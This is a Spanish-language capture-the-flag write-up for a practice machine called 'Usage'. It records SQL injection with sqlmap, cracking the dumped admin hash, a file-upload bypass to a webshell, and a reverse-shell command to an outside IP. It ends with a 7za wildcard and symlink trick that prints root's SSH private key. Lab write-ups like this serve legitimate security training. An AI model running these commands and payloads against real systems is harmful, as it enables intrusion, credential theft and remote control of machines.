PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Añadimos el dominio **'usage.htb'** y el dominio **'admin.usage.htb'** al /etc/hosts

-Probamos a escanear con **SQLMAP** el Login de la Página **'usage.htb'** , el Login de **'admin.usage.htb'** y el formulario de registro de **'usage.htb'**, **SIN ÉXITO**.

-Clickamos en el enlace de **'Reset Password'** en:
	-http://usage.htb/login

-Nos piden que pongamos el email del que queremos cambiar la Contraseña, Probamos a poner una Comilla Simple:
	-Email: '
		Respuesta: 500 Server Error 
		(Este es el **Campo Vulnerable!!**)

## SQLI - DB Enumeration

### SQLMAP 

-Interceptamos la Petición en /forget-password y guardamos la Petición en un archivo para pasarsela a SQLMAP:
	-Burpsuite --> Click derecho --> Copy to File --> Name: email.req

-Listamos la BDS existentes:
	-sqlmap -r email.req  --level 5 --risk 3  -p email  --threads=10 --batch  --dbs 
		available databases [3]:
		[*] information_schema
		[*] performance_schema
		[*] usage_blog

-Listamos la Tablas:
	-sqlmap -r email.req -p email --threads=10 --batch -D usage_blog --tables
		[15 tables]
		+------------------------+
		| admin_menu             |
		| admin_operation_log    |
		| admin_permissions      |
		| admin_role_menu        |
		| admin_role_permissions |
		| admin_role_users       |
		| admin_roles            |
		| admin_user_permissions |
		| admin_users            |
		| blog                   |
		| failed_jobs            |
		| migrations             |
		| password_reset_tokens  |
		| personal_access_tokens |
		| users                  |
		+------------------------+


-Listamos la información de la Tabla 'admin_users'
	-sqlmap -r email.req -p email --threads=10 --batch -D usage_blog -T admin_users -C username,password --dump
		+---------------+--------------------------------------------------------------+
		| username          | password                                                     |
		+---------------+--------------------------------------------------------------+
		| admin | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA8G1S5ooO0gH5xVfUPrL2 |
		+---------------+--------------------------------------------------------------+
--------------------------------------------------------------------------------------------------------

-Lo rompemos con hashcat:
	-hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
		whatever1

-Nos vamos al Login http://admin.usage.htb/ y aportamos las credenciales obtenidas:
	-Username: admin
	-Password: whatever1
		**ESTAMOS DENTRO!!**

-Dentro del dashboard encontramos la siguiente versión:
	encore/laravel-admin:1.8.18

## File Upload 

-Buscamos en google versiones de Laravel vulnerables y encontramos:
	-Arbitrary File Upload  https://flyd.uk/post/cve-2023-24249/
		## Affected versions
		<= 1.8.19

-Nos creamos un archivo shell.jpg con una webshell

-Nos vamos a Administratror --> settings 

-Le damos a browse y seleccionamos el archivo 'shell.jpg' y le damos a 'submit' interceptando la Petición con Burpsuite

-Dentro de Burpsuite, añadimos un '.php' al archivo.jpg:
	filename="shell.jpg.php"

-Enviamos la Petición y volvemos a la web

-Se ha subido el archivo a la siguiente ruta:
	-uploads/images/shell.jpg.php

-Nos mandamos una RS:
	-http://admin.usage.htb/uploads/images/shell.jpg.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.27/1234 0>&1'
		**dash@usage:/$ whoami**
			**dash**
------------------------------------------------------------------------------------------------

## Escalada de Privilegios

-Vemos el contenido del siguiente archivo:
	-/home/dash/.monitrc
		![[Pasted image 20250528130817.png]]

-Probamos la contraseña con el otro usuario que hay en la máquina:
	-su xander
	-Password: 3nc0d3d .....
		xander@usage:/$ whoami
			xander

-sudo -l
	(ALL : ALL) NOPASSWD: /usr/bin/usage_management

-Lo ejecutamos y parece ser un programa:
	-sudo /usr/bin/usage_management
		Choose an option:
			1. Project Backup
			2. Backup MySQL data
			3. Reset admin password
			Enter your choice (1/2/3):

-Vemos el Contenido del Binario con Strings:
	-strings /usr/bin/usage_management
		-Hace esto si le das a la Opción 1:
			/var/www/html/
			/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *

-Vulnerabilidad: Esta copiando todo lo que hay en /var/www/html a /var/backups/project.zip
, con el * . Esta aplicando el Binario 7z para comprimir el Contenido

-Usamos la siguiente referencia de Hacktricks:
	https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/wildcards-spare-tricks	
		cd /path/to/7z/acting/folder
		touch @root.txt
		ln -s /file/you/want/to/read root.txt

-En nuestro caso:
	-touch @root.txt
	-ln -s /root/.ssh/id_rsa root.txt (referenciamos el archivo que hemos creado para que apunte a la Clave Privada de SSH de root)
		-Quedaría así:
			 root.txt -> /root/.ssh/id_rsa

-sudo /usr/bin/usage_management
	-Seleccionamos la opción 1:
		-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW 
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q 
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----

**-Lo hemos Conseguido!!**

-Le damos los permisos necesarios:
	-chmod 600 id_rsa

-ssh -i id_rsa root@10.10.11.18
	**root@usage:~# whoami**
		**root**




